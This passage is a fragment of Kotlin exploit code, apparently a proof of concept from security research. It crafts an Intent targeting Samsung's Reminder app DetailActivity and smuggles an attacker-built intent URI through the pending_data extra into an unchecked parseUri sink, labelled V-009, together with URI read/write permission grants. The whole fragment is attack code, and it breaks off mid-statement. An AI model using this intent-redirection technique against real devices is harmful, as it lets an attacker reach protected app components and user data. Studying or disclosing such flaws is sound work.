val smuggledUri = smuggledResult.toUri(Intent.URI_INTENT_SCHEME)

val reach = Intent(Intent.ACTION_VIEW).apply {
    setClassName(
        "com.samsung.android.app.reminder",
        "com.samsung.android.app.reminder.ui.detail.view.DetailActivity"
    )
    data = Uri.parse("uuid://reminder.uuid/dummy")
    putExtra("pending_request", 100)          // REQUEST_LOAD_IMG path
    putExtra("pending_result", -1)            // RESULT_OK
    putExtra("pending_data", smuggledUri)     // V-009 sink: parseUri(str,1) with no checks
    addFlags(
        Intent.FLAG_ACTIVITY_NEW_TASK or
        Intent.FLAG_GRANT_READ_URI_PERMISSION or
        Intent.FLAG_GRANT_WRITE_URI_PERMISSION
